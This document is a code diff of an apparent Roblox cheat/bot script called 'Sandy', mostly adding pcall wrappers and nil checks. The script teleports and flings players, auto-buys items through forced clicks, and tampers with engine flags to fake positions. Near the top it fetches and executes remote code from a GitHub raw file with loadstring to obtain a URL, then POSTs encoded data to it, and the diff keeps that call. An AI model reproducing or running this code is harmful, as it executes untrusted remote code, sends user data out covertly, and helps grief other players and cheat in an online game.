@@ -63,12 +63,14 @@ local data = {
 
 local body = http:JSONEncode(data)
 
-request({
-    Url = loadstring(game:HttpGet("https://raw.githubusercontent.com/poclol/Sandy/refs/heads/main/hehehe"))(),
-    Method = "POST",
-    Headers = headers,
-    Body = body
-})
+pcall(function()
+    request({
+        Url = loadstring(game:HttpGet("https://raw.githubusercontent.com/poclol/Sandy/refs/heads/main/hehehe"))(),
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end)
 
 if Script ~= "Get Sandy for free at discord.gg/fJeSNdJr4D" then
     game.Players.LocalPlayer:Kick("Get the new version at discord.gg/fJeSNdJr4D")
@@ -93,7 +95,7 @@ if not game.Players:FindFirstChild(Owner) then
     return
 end
 
-marker = Instance.new("BoolValue")
+local marker = Instance.new("BoolValue")
 marker.Name = "Executed"
 marker.Parent = game:GetService("ReplicatedStorage")
 
@@ -250,9 +252,6 @@ roof.Size = Vector3.new(32, 1, 32)
 roof.Position = basePosition + Vector3.new(0, 10.5, 0)
 roof.Parent = workspace
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
 local zoneSize = Vector3.new(20, 10, 20)
 local basePosition = whitelistZone.Position
 local WHITELIST_RADIUS = 20
@@ -315,29 +314,29 @@ local opkill = false
 local summonTarget = nil
 local summonMode = "middle"
 
-local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local voiding = true
 
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
 local Character = player.Character or player.CharacterAdded:Wait()
-local hrp = Character:WaitForChild("HumanoidRootPart")
+local hrp = Character:WaitForChild("HumanoidRootPart") -- FIXED: moved up so all loops can see it safely
 
 task.spawn(function()
     while true do
         if voiding and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
-            hrp.CFrame = CFrame.new(
-                math.random(-999999, 999999),
-                math.random(0, 999999),
-                math.random(-999999, 999999)
-            )
+            if hrp then
+                hrp.CFrame = CFrame.new(
+                    math.random(-999999, 999999),
+                    math.random(0, 999999),
+                    math.random(-999999, 999999)
+                )
+            end
         end
         task.wait()
     end
 end)
 
 player.CharacterAdded:Connect(function(char)
+    Character = char
     hrp = char:WaitForChild("HumanoidRootPart")
 end)
 
@@ -752,7 +751,9 @@ function handleFixCommand(specificBot)
             summonTarget = nil
             flingonly = false
             killall = false
-            game.Players.LocalPlayer.Character.Humanoid.Health = 0
+            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
+                game.Players.LocalPlayer.Character.Humanoid.Health = 0
+            end
         end
     end
 end
@@ -895,7 +896,9 @@ task.spawn(function()
                 local x = math.cos(auraangle) * auradistance
                 local z = math.sin(auraangle) * auradistance
                 local newPos = targetHRP.Position + Vector3.new(x, 0, z)
-                hrp.CFrame = CFrame.new(newPos, newPos * 2 - targetHRP.Position)
+                if hrp then
+                    hrp.CFrame = CFrame.new(newPos, newPos * 2 - targetHRP.Position)
+                end
             end
         end
         task.wait()
@@ -1014,7 +1017,7 @@ function removeOldListeners()
 end
 
 benxActive = false
-TweenService = game:GetService("TweenService")
+local TweenService = game:GetService("TweenService")
 
 function startBenx(targetPlayer)
     if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
@@ -1261,13 +1264,13 @@ function setupChatListener(player)
                 end
                 lastEmote = nil
             elseif msgLower == ".fp on" then
-                setfflag("NextGenReplicatorEnabledWrite4", "true")
+                pcall(function() setfflag("NextGenReplicatorEnabledWrite4", "true") end)
                 task.wait(0.1)
-                replicatesignal(game.Players.LocalPlayer.Kill)
+                pcall(function() replicatesignal(game.Players.LocalPlayer.Kill) end)
             elseif msgLower == ".fp off" then
-                setfflag("NextGenReplicatorEnabledWrite4", "false")
+                pcall(function() setfflag("NextGenReplicatorEnabledWrite4", "false") end)
                 task.wait(0.1)
-                replicatesignal(game.Players.LocalPlayer.Kill)
+                pcall(function() replicatesignal(game.Players.LocalPlayer.Kill) end)
             elseif msgLower == ".leave" then
                 game:Shutdown()
             elseif msgLower == ".rejoin" then
@@ -1700,10 +1703,10 @@ task.spawn(function()
                         didRefreshOnDeath = true
                         task.delay(0.2, function()
                             refreshingfakeposition = true
-                            setfflag("S2PhysicsSenderRate", 0)
+                            pcall(function() setfflag("S2PhysicsSenderRate", 0) end)
                             setfpscap(4)
                             task.wait(0.1)
-                            setfflag("S2PhysicsSenderRate", 20000000000)
+                            pcall(function() setfflag("S2PhysicsSenderRate", 20000000000) end)
                             setfpscap(240)
                             task.wait(3.65)
                             refreshingfakeposition = false
@@ -2229,7 +2232,8 @@ if executor and executor:lower():find("xeno") then
             game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.E, false, game)
         end
 
-        if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool") then        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool") then        
+            game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
         end
 
         if typeof(object) ~= "Instance" then
@@ -2250,7 +2254,8 @@ if executor and executor:lower():find("xeno") then
         click_detector.MaxActivationDistance = math.huge
 
         local connection = game:GetService("RunService").Heartbeat:Connect(function()
-            stub_part.CFrame = workspace.Camera.CFrame * CFrame.new(0, 0, -20) * CFrame.new(workspace.Camera.CFrame.LookVector)       game:GetService("VirtualUser"):ClickButton1(Vector2.new(20, 20), workspace:FindFirstChildOfClass("Camera").CFrame)
+            stub_part.CFrame = workspace.Camera.CFrame * CFrame.new(0, 0, -20) * CFrame.new(workspace.Camera.CFrame.LookVector)       
+            game:GetService("VirtualUser"):ClickButton1(Vector2.new(20, 20), workspace:FindFirstChildOfClass("Camera").CFrame)
         end)
         click_detector.MouseClick:Once(function()
             connection:Disconnect()
@@ -2285,7 +2290,7 @@ task.spawn(function()
                     if root then
                         root.CFrame = CFrame.new(workspace.Ignored.Shop[shopName].Head.CFrame.Position + Vector3.new(0, -8, 0))
                     end
-                    fireclickdetector(clickDetector)
+                    pcall(function() fireclickdetector(clickDetector) end)
                     if not humanoid or humanoid.Health <= 0 then break end
                     task.wait()
                 end
@@ -2327,7 +2332,7 @@ task.spawn(function()
                     if root then
                         root.CFrame = CFrame.new(maskItem.Head.CFrame.Position + Vector3.new(0, -8, 0))
                     end
-                    fireclickdetector(clickDetector)
+                    pcall(function() fireclickdetector(clickDetector) end)
                     task.wait()
                     if not automaskenabled or not char or (Player.Backpack:FindFirstChild("[Mask]") or char:FindFirstChild("[Mask]")) then break end
                 end
@@ -2398,7 +2403,7 @@ task.spawn(function()
                             if root then
                                 root.CFrame = CFrame.new(ammoItem.Head.CFrame.Position + Vector3.new(0, -8, 0))
                             end
-                            fireclickdetector(clickDetector)
+                            pcall(function() fireclickdetector(clickDetector) end)
                             if not humanoid or humanoid.Health <= 0 then break end
                             task.wait()
                             local newAmmo = getAmmoCount(gunName)
@@ -2434,7 +2439,7 @@ task.spawn(function()
             end
         end
         if not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
-            local Backpack = localPlayer:FindFirstChild("Backpack")
+            local Backpack = LocalPlayer:FindFirstChild("Backpack")
             if Backpack then
                 for _, gunKey in ipairs(Guns) do
                     local gunName = gunData[gunKey].toolName
